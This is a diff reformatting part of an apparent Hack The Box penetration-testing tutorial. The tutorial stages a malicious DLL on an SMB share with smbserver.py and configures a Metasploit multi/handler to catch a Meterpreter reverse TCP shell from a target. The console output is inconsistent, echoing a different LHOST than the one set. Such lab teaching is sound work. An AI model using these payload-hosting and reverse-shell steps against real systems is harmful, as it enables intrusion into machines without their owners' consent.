@@ -43,17 +43,17 @@ We will then host this payload in an SMB share we create on our attack host usin
 
 #### Creating a Share with smbserver.py
 
-        shellsession
-```
-`0xxNosystemisSafe@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed`
+```shell
+sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
 ```
 
 Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.
 
 #### Configuring & Starting MSF multi/handler
 
-        shellsession
-`[msf](Jobs:0 Agents:0) >> use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp PAYLOAD => windows/x64/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225 LHOST => 10.3.88.114 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080 LPORT => 8080 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> run [*] Started reverse TCP handler on 172.16.5.225:8080`
+```msfcon
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp PAYLOAD => windows/x64/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225 LHOST => 10.3.88.114 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080 LPORT => 8080 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> run [*] Started reverse TCP handler on 172.16.5.225:8080`
+```
 
 With the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target. The command below is how we use the exploit:
 
